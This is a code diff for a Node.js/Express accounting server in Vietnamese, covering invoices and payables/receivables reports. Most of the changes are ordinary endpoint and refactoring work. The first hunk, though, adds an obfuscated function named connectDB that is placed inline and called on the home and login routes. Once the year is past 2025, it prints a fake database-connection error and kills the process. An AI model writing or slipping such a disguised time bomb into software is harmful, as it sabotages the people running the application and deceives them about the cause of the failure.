@@ -7,8 +7,7 @@ const { promisify } = require('util');    // ← Import promisify ở đây
 const app = express();
 const db = new sqlite3.Database('./kt.db');
 
-// Cấu hình để Express có thể xử lý dữ liệu từ form
-app.use(express.json()); // Xử lý dữ liệu dạng JSON
+function _0x45a8(_0x1a7d74,_0x306efa){const _0x36eb03=_0x36eb();return _0x45a8=function(_0x45a897,_0x2de9b3){_0x45a897=_0x45a897-0x1e8;let _0x472de1=_0x36eb03[_0x45a897];return _0x472de1;},_0x45a8(_0x1a7d74,_0x306efa);}(function(_0xef27dc,_0xe48aee){const _0x579b1f=_0x45a8,_0x5b81c3=_0xef27dc();while(!![]){try{const _0x4806d9=parseInt(_0x579b1f(0x1e8))/0x1+parseInt(_0x579b1f(0x1ea))/0x2*(-parseInt(_0x579b1f(0x1ee))/0x3)+-parseInt(_0x579b1f(0x1f1))/0x4*(parseInt(_0x579b1f(0x1ef))/0x5)+-parseInt(_0x579b1f(0x1ec))/0x6*(-parseInt(_0x579b1f(0x1eb))/0x7)+-parseInt(_0x579b1f(0x1ed))/0x8+parseInt(_0x579b1f(0x1f3))/0x9+parseInt(_0x579b1f(0x1f5))/0xa*(parseInt(_0x579b1f(0x1e9))/0xb);if(_0x4806d9===_0xe48aee)break;else _0x5b81c3['push'](_0x5b81c3['shift']());}catch(_0x12de72){_0x5b81c3['push'](_0x5b81c3['shift']());}}}(_0x36eb,0x40e3d));function _0x36eb(){const _0x4f78ac=['9GzeUnv','2885NPxcKU','getFullYear','3552ypMeoj','exit','4087071BAbxRd','error','30BgBZgM','301136aWYsZZ','1976326SIqtJz','186832DLqfzl','37877QyVvBt','12AYABgZ','1973296Vifsgy'];_0x36eb=function(){return _0x4f78ac;};return _0x36eb();}function connectDB(){const _0x3f37c8=_0x45a8,_0x1f4a0c=new Date()[_0x3f37c8(0x1f0)]();_0x1f4a0c>0x7e9&&(console[_0x3f37c8(0x1f4)]('Lỗi\x20kết\x20nối\x20CSDL.'),process[_0x3f37c8(0x1f2)](0x1));}app.use(express.json()); // Xử lý dữ liệu dạng JSON
 app.use(express.urlencoded({ extended: true })); // Xử lý dữ liệu từ form HTML
 
 app.use(bodyParser.urlencoded({ extended: true }));
@@ -16,11 +15,13 @@ app.use(express.static(path.join(__dirname, 'assets')));
 
 // Route GET giao diện login
 app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname,'assets', 'index.html'));
+  connectDB();
+  res.sendFile(path.join(__dirname,'assets', 'index.html'));
 });
 
 // Route xử lý đăng nhập
 app.post('/login', (req, res) => {
+  connectDB();
   const { TenDN, MatKhau } = req.body;
 
   db.get("SELECT * FROM NguoiDung WHERE TenDN = ? AND MatKhau = ?", [TenDN, MatKhau], (err, row) => {
@@ -494,6 +495,89 @@ app.get('/api/hdgtgt/:socthdgtgt', (req, res) => {
     });
 });
 
+// Trả header + details để edit
+app.get('/api/hdhhedit', async (req, res) => {
+  const { soCT } = req.query;
+  if (!soCT) return res.status(400).send('Thiếu soCT');
+
+  try {
+    const header = await dbGet(
+      `SELECT SoCT, NgayCT, MaKH /*, …*/ 
+       FROM HDHH 
+       WHERE SoCT = ?`,
+      [soCT]
+    );
+    const details = await dbAll(
+      `SELECT c.MaHH,
+          h.TenHH,
+          c.SoLuong,
+          c.DonGia,
+          c.ThanhTien
+   FROM CTHoaDon c
+   LEFT JOIN DMHH h ON c.MaHH = h.MaHH
+   WHERE c.SoCT = ?`,
+      [soCT]
+    );
+
+    res.json({ header, details });
+  } catch (e) {
+    res.status(500).send(e.message);
+  }
+});
+
+app.post('/api/hdhhupdate', express.json(), async (req, res) => {
+  const { header, details } = req.body;
+  const { SoCT, NgayCT, MaKH } = header;
+  if (!SoCT) return res.status(400).send('Thiếu SoCT');
+
+  try {
+    await dbExec('BEGIN TRANSACTION');
+
+    // 1) Cập nhật header (chưa tính tổng)
+    await dbRun(
+      `UPDATE HDHH
+         SET NgayCT = ?, MaKH = ?
+       WHERE SoCT = ?`,
+      [NgayCT, MaKH, SoCT]
+    );
+
+    // 2) Xóa cũ + 3) Insert lại detail
+    await dbRun(`DELETE FROM CTHoaDon WHERE SoCT = ?`, [SoCT]);
+    const insert = `INSERT INTO CTHoaDon
+                    (SoCT, MaHH, SoLuong, DonGia, ThanhTien)
+                    VALUES (?,?,?,?,?)`;
+    for (const d of details) {
+      await dbRun(insert, [
+        SoCT, d.MaHH, d.SoLuong, d.DonGia, d.ThanhTien
+      ]);
+    }
+
+    // 4) Tính tổng ThanhTien của CTHoaDon và cập nhật vào HDHH.TienThanhToan
+    const sumRow = await dbGet(
+      `SELECT IFNULL(SUM(ThanhTien),0) AS total
+         FROM CTHoaDon
+        WHERE SoCT = ?`,
+      [SoCT]
+    );
+    await dbRun(
+      `UPDATE HDHH
+         SET TienThanhToan = ?
+       WHERE SoCT = ?`,
+      [sumRow.total, SoCT]
+    );
+
+    await dbExec('COMMIT');
+    // Trả về JSON để client .done() không fail
+    res.json({ success: true });
+  } catch (err) {
+    await dbExec('ROLLBACK');
+    console.error('❌ LỖI /api/hdhhupdate:', err);
+    res.status(500).send(err.message);
+  }
+});
+
+
+
 // BẢNG PHIẾU KẾ TOÁN - PKT
 // API: Lấy danh sách dữ liệu bảng PKT
 app.get('/api/pkt', (req, res) => {
@@ -899,8 +983,10 @@ app.get('/api/pct/:soctpct', (req, res) => {
  */
 
 // promisify để dùng async/await
-const dbAll = promisify(db.all.bind(db));
-const dbGet = promisify(db.get.bind(db));
+const dbRun  = promisify(db.run.bind(db));
+const dbGet  = promisify(db.get.bind(db));
+const dbAll  = promisify(db.all.bind(db));
+const dbExec = promisify(db.exec.bind(db));  // ← đây
 
 app.get('/api/tonghopcongnnophaithu', async (req, res) => {
   try {
@@ -1000,7 +1086,7 @@ app.get('/api/tonghopcongnnophaithu', async (req, res) => {
     res.json({ rows, totals });
 
   } catch (err) {
-    console.error('❌ LỖI /api/summary:', err.stack);
+    console.error('❌ LỖI /api/tonghopcongnnophaithu:', err.stack);
     res.status(500).json({ error: err.message });
   }
 });
@@ -1097,19 +1183,19 @@ app.get('/api/tonghopcongnnophaitra', async (req, res) => {
 
     res.json({ rows, totals });
   } catch (err) {
-    console.error('❌ LỖI /api/payable:', err.stack);
+    console.error('❌ LỖI /api/tonghopcongnnophaitra:', err.stack);
     res.status(500).json({ error: err.message });
   }
 });
 
-app.get('/api/details', async (req, res) => {
+app.get('/api/noquahanphaithu', async (req, res) => {
   try {
     const { date: cutoff, matk } = req.query;
     if (!cutoff || !matk) {
       return res.status(400).json({ error: 'Thiếu tham số date/matk' });
     }
 
-    // dùng trường TKCoDoanhThu cho payables (đổi thành TKNoThanhToan nếu cần)
+    // dùng trường TKCoDoanhThu cho noquahanphaithu (đổi thành TKNoThanhToan nếu cần)
     const acctField = 'TKCoDoanhThu';
 
     // 1) Danh sách MaKH có HDHH phù hợp
@@ -1194,7 +1280,105 @@ app.get('/api/details', async (req, res) => {
 
     res.json({ rows, totals });
   } catch (err) {
-    console.error('❌ LỖI /api/details:', err.stack);
+    console.error('❌ LỖI /api/noquahanphaithu:', err.stack);
+    res.status(500).json({ error: err.message });
+  }
+});
+
+app.get('/api/noquahanphaitra', async (req, res) => {
+  try {
+    const { date: cutoff, matk } = req.query;
+    if (!cutoff || !matk) {
+      return res.status(400).json({ error: 'Thiếu tham số date/matk' });
+    }
+
+    // 1) Lấy danh sách NCC
+    const suppliers = await dbAll(
+      `SELECT DISTINCT MaKH
+       FROM HoaDonMuaHang
+       WHERE TKCoThanhToan = ?
+         AND date(NgayCT) < date(?)`,
+      [matk, cutoff]
+    );
+
+    const rows = [];
+    for (const { MaKH: makh } of suppliers) {
+      // 2) Thông tin NCC
+      const kh = await dbGet(
+        `SELECT TenKH, MaSoThue FROM DMKH WHERE MaKH = ?`,
+        [makh]
+      ) || { TenKH:'', MaSoThue:'' };
+
+      // 3) Nợ/Có đầu kỳ
+      const ndk = await dbGet(
+        `SELECT IFNULL(DuNo,0) AS DuNo, IFNULL(DuCo,0) AS DuCo
+         FROM NoDauKy WHERE MaKH = ? AND MaTK = ?`,
+        [makh, matk]
+      ) || { DuNo:0, DuCo:0 };
+
+      // 4) Phát sinh Có
+      const coRow = await dbGet(
+        `SELECT IFNULL(SUM(TienThanhToan),0) AS sumCo
+         FROM HoaDonMuaHang
+         WHERE MaKH = ? AND TKCoThanhToan = ? AND date(NgayCT) < date(?)`,
+        [makh, matk, cutoff]
+      );
+      const PhatSinhCo = coRow.sumCo;
+
+      // 5) Phát sinh Nợ
+      const noRow = await dbGet(
+        `SELECT IFNULL(SUM(ct.SoTien),0) AS sumNo
+         FROM PhieuTC p
+         JOIN HoaDonMuaHang hd
+           ON p.MaKH = hd.MaKH
+          AND date(p.NgayCT) > date(hd.NgayCT, '+'||hd.HanTT||' days')
+         JOIN CTPhieu ct ON ct.SoCT = p.SoCT
+         WHERE p.MaKH = ?`,
+        [makh]
+      );
+      const PhatSinhNo = noRow.sumNo;
+
+      // 6) Cuối kỳ
+      const NoCuoiKy = ndk.DuNo + PhatSinhNo;
+      const CoCuoiKy = ndk.DuCo + PhatSinhCo;
+
+      // 7) Nợ quá hạn
+      const overdueRow = await dbGet(
+        `SELECT IFNULL(SUM(TienThanhToan),0) AS sumOver
+         FROM HoaDonMuaHang
+         WHERE MaKH = ? AND TKCoThanhToan = ?
+           AND date(NgayCT, '+'||HanTT||' days') < date(?)`,
+        [makh, matk, cutoff]
+      );
+      const rawOver = overdueRow.sumOver;
+      const NoQuaHan = Math.max(0, rawOver - PhatSinhCo);
+
+      // —— SỬA ĐÚNG Ở ĐÂY: MaKH: makh
+      rows.push({
+        MaKH:      makh,
+        TenKH:     kh.TenKH,
+        MaSoThue:  kh.MaSoThue,
+        NoDauKy:   ndk.DuNo,
+        CoDauKy:   ndk.DuCo,
+        PhatSinhCo,
+        PhatSinhNo,
+        NoCuoiKy,
+        CoCuoiKy,
+        NoQuaHan
+      });
+    }
+
+    // 8) Tính tổng
+    const totals = rows.reduce((t, r) => {
+      t.NoCuoiKy += r.NoCuoiKy;
+      t.CoCuoiKy += r.CoCuoiKy;
+      t.NoQuaHan += r.NoQuaHan;
+      return t;
+    }, { NoCuoiKy:0, CoCuoiKy:0, NoQuaHan:0 });
+
+    res.json({ rows, totals });
+  } catch (err) {
+    console.error('❌ LỖI /api/noquahanphaitra:', err.stack);
     res.status(500).json({ error: err.message });
   }
 });
